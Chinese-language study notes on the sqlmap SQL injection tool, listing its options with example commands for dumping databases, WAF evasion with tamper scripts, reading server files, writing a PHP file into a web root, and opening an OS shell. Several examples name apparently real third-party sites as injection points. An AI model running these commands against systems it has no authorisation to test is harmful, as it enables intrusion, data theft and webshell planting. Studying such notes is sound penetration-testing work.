~~~~
title: sqlmap学习笔记
tags: 
  - 渗透测试
  - sqlmap
  - 漏洞分析
categories: 
  - 渗透测试
  - 漏洞分析
  - sqlmap
~~~~



# Sqlmap学习笔记

## sqlmap介绍

~~~
sqlmap 是一个由Python语言编写的开源渗透测试工具，它主要用来检测sql注入漏洞，是一款功能强大的sql漏洞检测利用工具。

它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite等
可以进行 sql盲注、union查询、显错注入、延迟注入、post注入、cookie注入等
其他功能:
执行命令、列举用户、检测权限、自动破解、数据导出等功能。
~~~

## 基本参数

~~~~
sqlmap.py -h 查看帮助
is-dba			当前用户权限
dbs				所有数据库
current-db		网站当前数据库
users			所有数据库用户
current-user	当前数据库用户
tables			参数:列表名
columns			参数:列字段
dump			参数:下载数据
--dump 			获取表中的数据，包含列 
--dump-all		转存DBMS数据库所有表项目
--level			测试等级(1-5)，默认为1

读取数据库--->读取表---->读取表的列---->获取内容
-D  			指定数据库
-T				指定表
-C				指定列
--dbms=mysql  oracle mssql     	指定数据库
--users			枚举所有用户
--passwords		枚举所有用户密码
--roles			列出数据库管理员角色
--privileges 	列出数据库管理员权限
~~~~

**列举数据库系统的架构**

~~~~
sqlmap.py -u "http://xx.com/int.php?id=1" --schema --batch --exclude-sysdbs
~~~~

## 探测等级

~~~
参数：--level

共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。
这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。
总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。
~~~

## 显示调式信息

~~~~
-v  显示调试信息 有7个级别

0、只显示python错误以及严重的信息。
1、同时显示基本信息和警告信息。（默认）
2、同时显示debug信息。
3、同时显示注入的payload。
4、同时显示HTTP请求。
5、同时显示HTTP响应头。
6、同时显示HTTP响应页面。
~~~~

## 风险等级

~~~

参数：--risk

共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。

在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。

测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。

~~~

## 获取目标

~~~~
参数：-u或者--url
格式：http(s)://targeturl[:port]/[…]
例如：python sqlmap.py -u http://www.target.com/vuln.php?id=1

从文本中获取多个目标扫描
参数：-m
文件中保存url格式如下，sqlmap会一个一个检测
www.target1.com/vuln1.php?q=foobar
www.target2.com/vuln2.asp?id=1
www.target3.com/vuln3/id/1*

参数：-r
sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。
比如文本文件内如下：
POST /vuln.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/4.0
id=1

参数：-g
sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。
例子：
python sqlmap.py -g "inurl:php?id="

--data
此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。
例子：
python sqlmap.py -u “http://www.cracer.com/cracer.php” --data=“id=1”

--param-del
参数拆分字符
当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。
例子：
python sqlmap.py -u "http://www.cracer.com/vuln.php" --data="query=foobar;d=1" --param-del=";" 

--cookie
适用于cookie注入
将参加加入cookie注入测试
sqlmap -u "http://www.ntjx.org/jsj/DownloadShow.asp" --cookie "id=9" --table --level 2

--referer
sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。
--headers
可以通过--headers参数来增加额外的http头
--hearders “client-ip: 1.1.1.1'”
--proxy
使用--proxy代理是格式为：http://url:port。
--proxy=http://127.0.0.1:1080
--proxy-file c:/1.txt


--delay
可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。
--timeout
可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。
设定重试超时
--retries
当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。
设定随机改变的参数值

--technique
这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。
支持的探测方式如下：
B: Boolean-based blind SQL injection（布尔型注入）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（可联合查询注入）
S: Stacked queries SQL injection（可多语句查询注入）
T: Time-based blind SQL injection（基于时间延迟注入）


默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。
--union-char
默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用--union-char只定UNION查询的字符。
二阶SQL注入
有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址.

--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为
有的管理员会把他当初用户数据库一样来使用它。

--search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。

可以在一下三种情况下使用：

-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。

你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后
根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。


参数：-s
sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。
保存HTTP(S)日志
参数：-t
这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。


--batch
用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
强制使用字符编码
--charset
不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：
--charset=GBK
--flush-session

如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。
自动获取form表单测试
--hex
有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：
例子：
sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors

--output-dir
sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：--output-dir=/tmp
从响应中获取DBMS的错误信息
参数：--parse-errors
有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。

--smart
有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。
例子：
$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=foo&id=1" --batch --smart
--mobile
有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。
例如：
$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile

--identify-waf
sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。

--check-waf
WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试
例如对一个受到ModSecurity WAF保护的MySQL例子：
$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3

~~~~

## 注册表

~~~
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。 当然，当前连接数据库的用户也需要有权限操作注册表。
读取注册表值
参数：--reg-read
写入注册表值
参数：--reg-add
删除注册表值
参数：--reg-del
注册表辅助选项
参数：--reg-key，--reg-value，--reg-data，--reg-type
需要配合之前三个参数使用，例子：
$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-
type=REG_SZ --reg-data=1

~~~

## 暴力破解表

~~~
参数：--common-tables
当使用--tables无法获取到数据库的表时，可以使用此参数。
通常是如下情况：
1、MySQL数据库版本小于5.0，没有information_schema表。
2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。
3、当前用户没有权限读取系统中保存数据结构的表的权限。
暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。
Xx  --common-tables -D testdb
参数：--common-columns
与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。
Xx  --common-columns  -T text -D testdb


注入点：http://testasp.vulnweb.com/Login.asp
几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass 

 sqlmap -u http://testasp.vulnweb.com/Login.asp --forms
 sqlmap -u http://testasp.vulnweb.com/Login.asp --data "tfUName=1&tfUPass=1"

~~~

## 搜索框注入

~~~
sqlmap.py -r search-test.txt
~~~

## 伪静态注入

~~~
注入点：http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html
sqlmap -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html
~~~

## base64编码注入

~~~
sqlmap -u http://ha.cker.in/index.php?tel=LTEnIG9yICc4OCc9Jzg5 --tamper base64encode.py –dbs
~~~

## 请求时间延迟

~~~~
参数：--time-sec
当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒
~~~~

## 执行sql语句

~~~
--sql-query="select @@version"
--sql-shell

sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。
如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。

~~~

## 文件读写

~~~
从数据库服务器中读取文件
参数：--file-read
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。

sqlmap.py -u "http://192.168.2.3:81/about/show.php
?lang=cn&id=22" --file-read="C:\Inetpub\wwwroot\mysql-php\1.php"

~~~

## 文件上传

~~~~
参数：--file-write,--file-dest
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。

sqlmap.py -u "http://192.168.2.129/article.php?id=5" --file-write="C:\1.php" --file-dest="/var/www/html/x.php"

~~~~

## 命令执行

~~~
参数：--os-cmd,--os-shell
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。
在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。
cmd			执行cmd命令（win）
shell			执行当前用户命令 
--os-shell
自动上传 脚本文件
返回shell

~~~

## waf

~~~
注入点:http://192.168.159.1/news.php?id=1
sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs  --batch --tamper "space2morehash.py"
space2hash.py   base64encode.py charencode.py

~~~

